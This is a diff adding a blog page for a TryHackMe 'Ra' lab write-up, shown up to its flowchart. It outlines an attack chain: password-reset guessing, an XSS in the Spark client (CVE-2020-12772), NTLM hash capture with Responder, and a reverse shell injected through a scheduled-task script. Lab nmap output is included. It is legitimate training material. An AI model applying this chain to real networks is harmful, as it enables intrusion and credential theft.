@@ -1,0 +1,2681 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TryHackMe - Ra WriteUp | 0xblivion.dev</title>
+<meta name="keywords" content="walkthrough, writeup, tryhackme, windows, active-directory, password-reset, xss, cve-2020-12772, ntlm, hash-cracking, privilege-escalation, account-operators, scheduled-task, command-injection, nmap,, kerberos, responder, docker, spark, xmpp">
+<meta name="description" content="Overview
+
+Ra is a Hard machine on TryHackme it started with exploiting a weak password reset mechanism on a web application. After finding employee names and guessing a security question based on a pet&rsquo;s name found in an image file, we get our initial credentials. This leads us to an SMB share with an installer for a vulnerable Spark XMPP client.
+The real challenge begins here: we have to set up a sandboxed environment to run the client, debug Java and audio errors within Docker, and finally exploit a Cross-Site Scripting (XSS) vulnerability (CVE-2020-12772) to capture another user&rsquo;s NTLM hash.">
+<meta name="author" content="0xblivion">
+<link rel="canonical" href="https://0xblivion.dev/posts/thm/hard/tryhackme-ra-writeup/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.7bb9e509f32b776e3778b3ea8539776721782bd73f8019534361265046bfd155.css" integrity="sha256-e7nlCfMrd243eLPqhTl3ZyF4K9c/gBlTQ2EmUEa/0VU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://0xblivion.dev/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://0xblivion.dev/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://0xblivion.dev/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://0xblivion.dev/apple-touch-icon.png">
+<link rel="mask-icon" href="https://0xblivion.dev/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://0xblivion.dev/posts/thm/hard/tryhackme-ra-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://0xblivion.dev/posts/thm/hard/tryhackme-ra-writeup/">
+  <meta property="og:site_name" content="0xblivion.dev">
+  <meta property="og:title" content="TryHackMe - Ra WriteUp">
+  <meta property="og:description" content="Overview Ra is a Hard machine on TryHackme it started with exploiting a weak password reset mechanism on a web application. After finding employee names and guessing a security question based on a pet’s name found in an image file, we get our initial credentials. This leads us to an SMB share with an installer for a vulnerable Spark XMPP client.
+The real challenge begins here: we have to set up a sandboxed environment to run the client, debug Java and audio errors within Docker, and finally exploit a Cross-Site Scripting (XSS) vulnerability (CVE-2020-12772) to capture another user’s NTLM hash.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-07T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-07-07T00:00:00+00:00">
+    <meta property="article:tag" content="Walkthrough">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Tryhackme">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active-Directory">
+    <meta property="article:tag" content="Password-Reset">
+    <meta property="og:image" content="https://0xblivion.dev/img/RA/RA.jpeg">
+  
+  <meta name="author" content="0xblivion">
+  <meta property="article:author" content="0xblivion">
+  <meta property="og:article:author" content="0xblivion">
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "author": {
+        "@type": "Person",
+        "name": "0xblivion"
+      }
+    }
+  </script>
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://0xblivion.dev/img/RA/RA.jpeg">
+<meta name="twitter:title" content="TryHackMe - Ra WriteUp">
+<meta name="twitter:description" content="Overview
+
+Ra is a Hard machine on TryHackme it started with exploiting a weak password reset mechanism on a web application. After finding employee names and guessing a security question based on a pet&rsquo;s name found in an image file, we get our initial credentials. This leads us to an SMB share with an installer for a vulnerable Spark XMPP client.
+The real challenge begins here: we have to set up a sandboxed environment to run the client, debug Java and audio errors within Docker, and finally exploit a Cross-Site Scripting (XSS) vulnerability (CVE-2020-12772) to capture another user&rsquo;s NTLM hash.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://0xblivion.dev/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "TryHackMe - Ra WriteUp",
+      "item": "https://0xblivion.dev/posts/thm/hard/tryhackme-ra-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TryHackMe - Ra WriteUp",
+  "name": "TryHackMe - Ra WriteUp",
+  "description": "Overview Ra is a Hard machine on TryHackme it started with exploiting a weak password reset mechanism on a web application. After finding employee names and guessing a security question based on a pet\u0026rsquo;s name found in an image file, we get our initial credentials. This leads us to an SMB share with an installer for a vulnerable Spark XMPP client.\nThe real challenge begins here: we have to set up a sandboxed environment to run the client, debug Java and audio errors within Docker, and finally exploit a Cross-Site Scripting (XSS) vulnerability (CVE-2020-12772) to capture another user\u0026rsquo;s NTLM hash.\n",
+  "keywords": [
+    "walkthrough", "writeup", "tryhackme", "windows", "active-directory", "password-reset", "xss", "cve-2020-12772", "ntlm", "hash-cracking", "privilege-escalation", "account-operators", "scheduled-task", "command-injection", "nmap,", "kerberos", "responder", "docker", "spark", "xmpp"
+  ],
+  "articleBody": "Overview Ra is a Hard machine on TryHackme it started with exploiting a weak password reset mechanism on a web application. After finding employee names and guessing a security question based on a pet’s name found in an image file, we get our initial credentials. This leads us to an SMB share with an installer for a vulnerable Spark XMPP client.\nThe real challenge begins here: we have to set up a sandboxed environment to run the client, debug Java and audio errors within Docker, and finally exploit a Cross-Site Scripting (XSS) vulnerability (CVE-2020-12772) to capture another user’s NTLM hash.\nAfter cracking the hash, we get a shell as a user who is part of the Account Operators group. This group permission allows us to reset another user’s password, modify a script they own, and leverage a scheduled task that executes the script to gain command execution and ultimately a system shell.\n+ − ⌂ [https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Check Web (Reset Page) [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Scrape User Emails [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Validate via Kerbrute [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Find Lily + Image → \"Sparky\" [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Reset Lily's Password [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Access SMB → Grab Spark Installer [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Setup Spark in Docker [https://i.ibb.co/ksTD4Kyw/bug-malicious-removebg-preview.png]Exploit CVE-2020-12772 XSS [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Catch NTLM Hash with Responder [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Crack Hash → Get Buse Password [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as Buse via Evil-WinRM [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Find checkservers.ps1 Script [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Reset brittanycr's Password [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Inject Reverse Shell in hosts.txt [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]Get SYSTEM Shell → Capture Root Flag Story:\n“You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!). Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?.”\nTarget IP 10.10.22.233 1. Reconnaissance (TA0043) As always, we kick things off with an nmap scan to see what we’re up against\n0xblivion@:ra ~ root@localhost:~# sudo nmap -sVC -oA nmap/ra 10.10.22.233 -vv # Nmap 7.95 scan initiated Mon Jul 7 10:18:12 2025 as: /usr/lib/nmap/nmap -sVC -oA nmap/ra -vv 10.10.22.233 Nmap scan report for 10.10.22.233 Host is up, received echo-reply ttl 125 (0.13s latency). Scanned at 2025-07-07 10:18:12 EDT for 102s Not shown: 979 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 125 Simple DNS Plus 80/tcp open http syn-ack ttl 125 Microsoft IIS httpd 10.0 |_http-title: Windcorp. |_http-server-header: Microsoft-IIS/10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-07-07 14:18:25Z) 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 125 464/tcp open kpasswd5? syn-ack ttl 125 593/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 125 2179/tcp open vmrdp? syn-ack ttl 125 3268/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 125 3389/tcp open ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: WINDCORP | NetBIOS_Domain_Name: WINDCORP | NetBIOS_Computer_Name: FIRE | DNS_Domain_Name: windcorp.thm | DNS_Computer_Name: Fire.windcorp.thm | DNS_Tree_Name: windcorp.thm | Product_Version: 10.0.17763 |_ System_Time: 2025-07-07T14:18:54+00:00 |_ssl-date: 2025-07-07T14:19:33+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=Fire.windcorp.thm | Issuer: commonName=Fire.windcorp.thm | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-07-06T14:17:39 | Not valid after: 2026-01-05T14:17:39 | MD5: 6e17:c117:2e4b:a1ad:0b3a:1b48:b82e:a760 | SHA-1: 9281:bfd7:f2ad:5373:8204:8124:d95a:2a4a:9282:70f7 | -----BEGIN CERTIFICATE----- | MIIC5jCCAc6gAwIBAgIQFqZeNiOsS7xONsYOVUv+oTANBgkqhkiG9w0BAQsFADAc | MRowGAYDVQQDExFGaXJlLndpbmRjb3JwLnRobTAeFw0yNTA3MDYxNDE3MzlaFw0y | NjAxMDUxNDE3MzlaMBwxGjAYBgNVBAMTEUZpcmUud2luZGNvcnAudGhtMIIBIjAN | BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw/mMB77zSh9MEBmBU9lZFArRskth | xAg2mN/g2siWl4asufhCxMK+0rfsxuPd4PsrdA72ONoR2DPyoWesIJvZxMlOizCJ | Z6jiUjeNIXwEoWOaML+FWYOgtsz4XgyS0oazidKXAAU7+aODndqIniX8BVFBJ3zL | LUFZ+TcpzFWeb+Ndacc87Dj6tsMPH2SY6ns2w4YGTLk/x2CEBeZqbQNAehF+ktlv | J0EhLkT8EFSUtdRx449hLoLM52W7ablEk5PGvotmzjr5ZTgeyPR1u62y5BMzW1Ml | e3Wd2JezqWwJD4F8lIrUOffXOtijd6qqclqBX90q4vw9UgcbKqOkCCiIyQIDAQAB | oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN | AQELBQADggEBAFZhYT1jQyIWH5c6baktb7Y3eL61YgBc7A4yN4MLbRX5K4oIAhQC | A/aYTwySTWpSTUHShuaqlaSiDQhMzc5ytWmv0pg5DHqXbbESgX7MwI1q8HMCOOyf | /Ir1F1zSiNcN94tUxRbjMHTdy21E8ainEXohDd7gCmIFNVJH2LrE4oMAA5RpfTdC | Rhj+B016uUJLg3cShSitcG5W32dcV1uYFj3T/P9UeFDib6FzeX7GvBPT7RkXWPVR | fEzVHC/GEKUw0mggm0EidkNH7xP1U94afc641lvHtbPtiOgU1DCOGniL0QpyUcqW | 5pyXi3PC+70iRWK8KVXTSrCU7xdY1EwFJSQ= |_-----END CERTIFICATE----- 5222/tcp open jabber syn-ack ttl 125 |_ssl-date: 2025-07-07T14:19:34+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=fire.windcorp.thm | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm | Issuer: commonName=fire.windcorp.thm | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-05-01T08:39:00 | Not valid after: 2025-04-30T08:39:00 | MD5: b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7 | SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae | -----BEGIN CERTIFICATE----- | MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE | AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz | OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN | AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK | /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr | IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89 | X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8 | DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE | UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD | VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w | HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf | sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR | 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ | II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk | n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k | +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7 | v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T | LucP |_-----END CERTIFICATE----- | fingerprint-strings: | RPCCheck: |_ | xmpp-info: | STARTTLS Failed | info: | stream_id: 41t586ui0i | errors: | invalid-namespace | (timeout) | unknown: | auth_mechanisms: | capabilities: | xmpp: | version: 1.0 | compression_methods: |_ features: 5269/tcp open xmpp syn-ack ttl 125 Wildfire XMPP Client | xmpp-info: | STARTTLS Failed | info: | features: | errors: | (timeout) | unknown: | capabilities: | xmpp: | auth_mechanisms: |_ compression_methods: 7070/tcp open http syn-ack ttl 125 Jetty 9.4.18.v20190429 |_http-server-header: Jetty(9.4.18.v20190429) |_http-title: Openfire HTTP Binding Service | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 7443/tcp open ssl/http syn-ack ttl 125 Jetty 9.4.18.v20190429 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | ssl-cert: Subject: commonName=fire.windcorp.thm | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm | Issuer: commonName=fire.windcorp.thm | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-05-01T08:39:00 | Not valid after: 2025-04-30T08:39:00 | MD5: b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7 | SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae | -----BEGIN CERTIFICATE----- | MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE | AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz | OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN | AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK | /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr | IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89 | X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8 | DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE | UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD | VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w | HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf | sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR | 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ | II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk | n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k | +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7 | v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T | LucP |_-----END CERTIFICATE----- |_http-server-header: Jetty(9.4.18.v20190429) |_http-title: Openfire HTTP Binding Service 7777/tcp open socks5 syn-ack ttl 125 (No authentication; connection failed) | socks-auth-info: |_ No authentication 9090/tcp open hadoop-datanode syn-ack ttl 125 Apache Hadoop | hadoop-datanode-info: |_ Logs: jive-ibtn jive-btn-gradient | hadoop-tasktracker-info: |_ Logs: jive-ibtn jive-btn-gradient | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Site doesn't have a title (text/html). |_http-favicon: Unknown favicon MD5: E4888EE8491B4EB75501996E41AF6460 9091/tcp open ssl/hadoop-datanode syn-ack ttl 125 Apache Hadoop | hadoop-datanode-info: |_ Logs: jive-ibtn jive-btn-gradient |_http-title: Site doesn't have a title (text/html). |_http-favicon: Unknown favicon MD5: E4888EE8491B4EB75501996E41AF6460 | hadoop-tasktracker-info: |_ Logs: jive-ibtn jive-btn-gradient | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | ssl-cert: Subject: commonName=fire.windcorp.thm | Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm | Issuer: commonName=fire.windcorp.thm | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-05-01T08:39:00 | Not valid after: 2025-04-30T08:39:00 | MD5: b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7 | SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae | -----BEGIN CERTIFICATE----- | MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE | AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz | OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN | AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK | /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr | IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89 | X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8 | DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE | UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD | VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w | HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf | sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR | 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ | II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk | n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k | +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7 | v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T | LucP |_-----END CERTIFICATE----- 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port5222-TCP:V=7.95%I=7%D=7/7%Time=686BD745%P=x86_64-pc-linux-gnu%r(RPC SF:Check,9B,\"",
+  "wordCount" : "1133",
+  "inLanguage": "en",
+  "image":"https://0xblivion.dev/img/RA/RA.jpeg","datePublished": "2025-07-07T00:00:00Z",
+  "dateModified": "2025-07-07T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "0xblivion"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://0xblivion.dev/posts/thm/hard/tryhackme-ra-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "0xblivion.dev",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://0xblivion.dev/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://0xblivion.dev/" accesskey="h" title="0xblivion.dev (Alt + H)">0xblivion.dev</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://0xblivion.dev/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xblivion.dev/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xblivion.dev/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://0xblivion.dev/">Home</a>&nbsp;»&nbsp;<a href="https://0xblivion.dev/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      TryHackMe - Ra WriteUp
+    </h1>
+    <div class="post-meta"><span title='2025-07-07 00:00:00 +0000 UTC'>July 7, 2025</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;0xblivion
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#1-reconnaissance-ta0043" aria-label="1. Reconnaissance (TA0043)">1. Reconnaissance (TA0043)</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#smb-null-authentication-t1203" aria-label="SMB Null Authentication (T1203)">SMB Null Authentication (T1203)</a></li>
+                <li>
+                    <a href="#web-and-user-enumeration-t1592" aria-label="Web and User Enumeration (T1592)">Web and User Enumeration (T1592)</a></li>
+                <li>
+                    <a href="#validating-domain-users-with-kerberos-t1201" aria-label="Validating Domain Users with Kerberos (T1201)">Validating Domain Users with Kerberos (T1201)</a></li>
+                <li>
+                    <a href="#resetting-lilys-password-t1098" aria-label="Resetting Lily’s Password (T1098)">Resetting Lily’s Password (T1098)</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#2-initial-access--the-spark-client-rabbit-hole-t1078" aria-label="2. Initial Access &amp; The Spark Client Rabbit Hole (T1078)">2. Initial Access &amp; The Spark Client Rabbit Hole (T1078)</a><ul>
+                        
+                <li>
+                    <a href="#exploiting-xss-in-spark-t1059007" aria-label="Exploiting XSS in Spark (T1059.007)">Exploiting XSS in Spark (T1059.007)</a></li></ul>
+                </li>
+                <li>
+                    <a href="#3-privilege-escalation-t1068" aria-label="3. Privilege Escalation (T1068)">3. Privilege Escalation (T1068)</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h1>
+<img src="/img/RA/RA.png" alt="" class="img-responsive" loading="lazy" />
+<p>Ra is a <code>Hard</code> machine on <code>TryHackme</code> it started with exploiting a weak password reset mechanism on a web application. After finding employee names and guessing a security question based on a pet&rsquo;s name found in an image file, we get our initial credentials. This leads us to an SMB share with an installer for a vulnerable Spark XMPP client.</p>
+<p>The real challenge begins here: we have to set up a sandboxed environment to run the client, debug Java and audio errors within Docker, and finally exploit a Cross-Site Scripting (<code>XSS</code>) vulnerability (<code>CVE-2020-12772</code>) to capture another user&rsquo;s NTLM hash.</p>
+<p>After cracking the hash, we get a shell as a user who is part of the <code>Account Operators</code> group. This group permission allows us to reset another user&rsquo;s password, modify a script they own, and leverage a scheduled task that executes the script to gain command execution and ultimately a system shell.</p>
+
+
+
+<div id="flowchart-1751931417973817081" class="attack-path-flowchart">
+  <div class="flowchart-controls">
+    <button class="zoom-btn" data-action="zoom-in" title="Zoom In">+</button>
+    <button class="zoom-btn" data-action="zoom-out" title="Zoom Out">−</button>
+    <button class="zoom-btn" data-action="reset" title="Reset View">⌂</button>
+  </div>
+  <div class="flowchart-data" style="display: none;">
+[https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan  
+[https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Check Web (Reset Page)  
+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Scrape User Emails  
+[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Validate via Kerbrute  
+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Find Lily + Image → "Sparky"  
+[https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Reset Lily's Password  
+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Access SMB → Grab Spark Installer  
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Setup Spark in Docker  
+[https://i.ibb.co/ksTD4Kyw/bug-malicious-removebg-preview.png]Exploit CVE-2020-12772 XSS  
+[https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Catch NTLM Hash with Responder  
+[https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Crack Hash → Get Buse Password  
+[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as Buse via Evil-WinRM  
